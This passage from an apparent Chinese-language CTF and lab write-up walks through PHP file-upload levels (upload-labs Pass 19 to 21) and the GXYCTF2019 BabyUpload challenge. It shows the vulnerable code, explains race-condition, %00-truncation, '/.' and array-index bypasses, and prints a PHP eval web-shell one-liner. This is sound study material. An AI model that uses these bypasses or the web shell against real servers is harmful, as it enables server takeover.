<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<blockquote>
<h2 id="代码审计过程"><a href="#代码审计过程" class="headerlink" title="代码审计过程"></a>代码审计过程</h2><p>一些参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$cls_upload_dir = &quot;&quot;;         // Directory to upload to.</span><br><span class="line">var $cls_max_filesize = 33554432; // Max file size.</span><br><span class="line">var $cls_arr_ext_accepted = array(</span><br><span class="line">   &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">   &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line">var $cls_file_exists = 0;         // Set to 1 to check if file exist before upload.</span><br><span class="line">var $cls_rename_file = 1;         // Set to 1 to rename file after upload.</span><br><span class="line">var $cls_verbal = 0;              // Set to 1 to return an a string instead of an error code.</span><br></pre></td></tr></table></figure>

<p>创建对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cls_filename = $file_name;   // Name of the upload file.</span><br><span class="line">cls_tmp_filename = $tmp_file_name;   // TMP file Name (tmp name by php).</span><br><span class="line">cls_filesize = $file_size;</span><br><span class="line">cls_file_rename_to = $file_rename_to;   //time()</span><br></pre></td></tr></table></figure>



<h3 id="upload"><a href="#upload" class="headerlink" title="upload:"></a>upload:</h3><h4 id="isUploadedFIle"><a href="#isUploadedFIle" class="headerlink" title="isUploadedFIle()"></a>isUploadedFIle()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_uploaded_file( $this-&gt;cls_tmp_filename )</span><br></pre></td></tr></table></figure>

<p>is_uploaded_file() 函数判断指定的文件是否是通过 HTTP POST 上传的。</p>
<h4 id="setDir-UPLOAD-PATH"><a href="#setDir-UPLOAD-PATH" class="headerlink" title="setDir( UPLOAD_PATH )"></a>setDir( UPLOAD_PATH )</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_writable( UPLOAD_PATH )</span><br></pre></td></tr></table></figure>

<p>is_writable() 函数判断指定的文件是否可写。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;cls_upload_dir = UPLOAD_PATH;	//给dir赋值</span><br></pre></td></tr></table></figure>



<h4 id="checkExtension"><a href="#checkExtension" class="headerlink" title="checkExtension()"></a>checkExtension()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array( strtolower( strrchr( $this-&gt;cls_filename, &quot;.&quot; )), $this-&gt;cls_arr_ext_accepted )</span><br></pre></td></tr></table></figure>

<p>检查上传文件时初始的文件名后缀是否符合白名单</p>
<h4 id="checkSize"><a href="#checkSize" class="headerlink" title="checkSize()"></a>checkSize()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;cls_filesize &lt; $this-&gt;cls_max_filesize</span><br></pre></td></tr></table></figure>

<p>即上传文件的大小要小于32MB</p>
<h4 id="checkFileExists"><a href="#checkFileExists" class="headerlink" title="checkFileExists()"></a>checkFileExists()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists( $this-&gt;cls_upload_dir . $this-&gt;cls_filename )</span><br></pre></td></tr></table></figure>

<p>判断文件是否原来就存在</p>
<h4 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $this-&gt;cls_tmp_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_filename ) == true</span><br></pre></td></tr></table></figure>

<p>判断文件是否成功上传，文件名为初始文件名</p>
<p><strong>通过这个函数后，文件就已经被上传到服务器了</strong></p>
<h4 id="renameFile"><a href="#renameFile" class="headerlink" title="renameFile()"></a>renameFile()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename( $this-&gt;cls_upload_dir . $this-&gt;cls_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_file_rename_to )</span><br></pre></td></tr></table></figure>

<p>判断重命名是否成功【不改变后缀】</p>
<p>如果全部通过这些函数，那么文件上传成功</p>
</blockquote>
<p>简单的说，就是利用文件上传至服务器到文件重命名中间这一段空隙，来执行已经上传的文件，生成一句话木马，而因为白名单的限制，我们可以利用apache解析漏洞，即白名单有.7z而apache不能解析.7z来上传base.php.7z绕过白名单，到服务器时变成base.php。</p>
<h3 id="小发现4"><a href="#小发现4" class="headerlink" title="小发现4"></a>小发现4</h3><p>复现并理解apache解析漏洞。</p>
<h2 id="Pass20【“-x2F-”结尾法-和-POST方法-00截断2】"><a href="#Pass20【“-x2F-”结尾法-和-POST方法-00截断2】" class="headerlink" title="Pass20【“&#x2F;.”结尾法 和 POST方法%00截断2】"></a>Pass20【“&#x2F;.”结尾法 和 POST方法%00截断2】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>先测试了下<code>pathinfo($file_name,PATHINFO_EXTENSION)</code>函数</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20-1.png" alt="20-1"></p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20-2.png" alt="20-2"></p>
<p>就想到可以利用%00截断：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20-3.png" alt="20-3"></p>
<p>找到上传名称里故意留的空格20，改成00</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20-4.png" alt="20-4"></p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20-5.png" alt="20-5"></p>
<p>即可上传成功，到服务器时，%00后的内容自动被截断剩下base.php</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>还遇到一种网上另一种方法：</p>
<blockquote>
<p>文件名改为base.php&#x2F;.<code>，move_uploaded_file函数结尾遇到</code>&#x2F;.&#96;的时候会删除它。</p>
</blockquote>
<h2 id="Pass21【数组绕过-“-x2F-”绕过】"><a href="#Pass21【数组绕过-“-x2F-”绕过】" class="headerlink" title="Pass21【数组绕过+“&#x2F;.”绕过】"></a>Pass21【数组绕过+“&#x2F;.”绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果按正常思维，这里是没有漏洞的，但是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">           $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>让我们想到如果上传一个数组。</p>
<blockquote>
<h2 id="数组的长度之谜"><a href="#数组的长度之谜" class="headerlink" title="数组的长度之谜"></a>数组的长度之谜</h2><p>当我们上传一个数组，只上传array[0]和array[2]时，此时array[1]值为空，且数组count为2.</p>
<p>此时 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file[count($file) - 1] != end($file)</span><br></pre></td></tr></table></figure>

<p>具体测试如下：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/21-2.png" alt="21-2"></p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/21-3.png" alt="21-3"></p>
</blockquote>
<p>如下图，我们的<code>$file[count($file) - 1]</code>就为空，<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>的值就是base.php.	，其中结尾的.会被windows自动忽略。</p>
<p>当然我们也可以利用Pass19学习的&#x2F;.绕过，使save_name[0]&#x3D;base.php&#x2F;，拼接完成后base.php&#x2F;.最后的&#x2F;.会被move_uploaded_file过滤</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/21-1.png" alt="21-1"></p>
<blockquote>
<p>注意：bp里————9921那一行和后面Content-Disposition那一行中间不能有空行，否则bp会不识别空行之后的内容！</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/102917199">参考这一篇</a></p>
<h2 id="真实题目"><a href="#真实题目" class="headerlink" title="真实题目"></a>真实题目</h2><h3 id="GXYCTF2019-BabyUpload【一句话木马变种-htaccess-MIME验证】"><a href="#GXYCTF2019-BabyUpload【一句话木马变种-htaccess-MIME验证】" class="headerlink" title="[GXYCTF2019]BabyUpload【一句话木马变种+.htaccess+MIME验证】"></a>[GXYCTF2019]BabyUpload【一句话木马变种+.htaccess+MIME验证】</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; </span></span><br><span class="line"><span class="string">&lt;title&gt;Upload&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;form action=\&quot;\&quot; method=\&quot;post\&quot; enctype=\&quot;multipart/form-data\&quot;&gt;</span></span><br><span class="line"><span class="string">上传文件&lt;input type=\&quot;file\&quot; name=\&quot;uploaded\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;submit\&quot; name=\&quot;submit\&quot; value=\&quot;上传\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;后缀名不能有ph！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;诶，别蒙我啊，这标志明显还是php啊&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;上传类型也太露骨了吧！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题一开始想多了，其实只要bp抓个包改一下MIME验证为image&#x2F;jpeg就可以上传base.jpg和.htaccess，其中base.jpg要用到一句话密码的变种来绕过&lt;?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;a1batr0ss&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>















<h2 id="一些有关知识"><a href="#一些有关知识" class="headerlink" title="一些有关知识"></a>一些有关知识</h2><ol>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/haimian/p/6066839.html">$FILE</a></li>
<li>Apache解析漏洞</li>
<li>.htaccess自解析</li>
<li>图片的二次渲染【imagecreatefromjpeg】</li>
</ol>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Vansnc/article/details/82528395">文件包含漏洞（完整版）_尼伯龙根-CSDN博客_文件包含漏洞利用</a></li>
</ol>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39101049/article/details/102501839">SSRF常见绕过思路_2ed-CSDN博客_ssrf绕过</a></li>
